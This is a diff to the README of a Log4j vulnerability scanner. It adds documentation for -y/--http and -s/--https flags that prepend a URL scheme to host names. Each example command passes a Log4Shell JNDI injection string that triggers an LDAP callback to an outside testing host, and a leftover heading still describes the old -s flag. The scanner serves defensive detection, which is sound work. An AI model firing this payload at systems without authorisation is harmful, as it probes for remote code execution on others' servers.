@@ -128,10 +128,39 @@ Webpages that are not in a production environment may not possess valid Secure S
 python3 scanForLog4jVulnerability.py -f ./domains.txt -p '${jndi:ldap://log4shell.huntress.com:1389/490de66a-129b-41b4-b194-69071695c39b}' -k
 ```
 
+## HTTP Scheme -y or --http (optional)
 
-## Schemes -s or --schemes (optional)
+If you have host names with no scheme specified, then this flag will prepend http:// to all of your hosts in your domains.txt file. Default is false.
 
-Hypertext Transfer Protocol (HTTP) and Hypertext Transfer Protocol Secure (HTTPS) are the only schemes currently supported. If you do not specify a scheme, then this shell script will test both HTTP and HTTPS.
+```
+example.com
+is modified to
+http://example.com
+```
+
+### Example Log4jShell_Scanner command using the -y HTTP Scheme flag:
+
+```shell
+python3 scanForLog4jVulnerability.py -f ./domains.txt -p '${jndi:ldap://log4shell.huntress.com:1389/490de66a-129b-41b4-b194-69071695c39b}' -y
+```
+
+
+## Schemes -s or --https (optional)
+
+If you have host names with no scheme specified, then this flag will prepend https:// to all of your hosts in your domains.txt file. Default is false.
+
+```
+example.com
+is modified to
+https://example.com
+```
+
+### Example Log4jShell_Scanner command using the -s HTTPS Scheme flag:
+
+```shell
+python3 scanForLog4jVulnerability.py -f ./domains.txt -p '${jndi:ldap://log4shell.huntress.com:1389/490de66a-129b-41b4-b194-69071695c39b}' -s
+```
+
 
 ### Example Log4jShell_Scanner command using the -s Schemes flag:
 
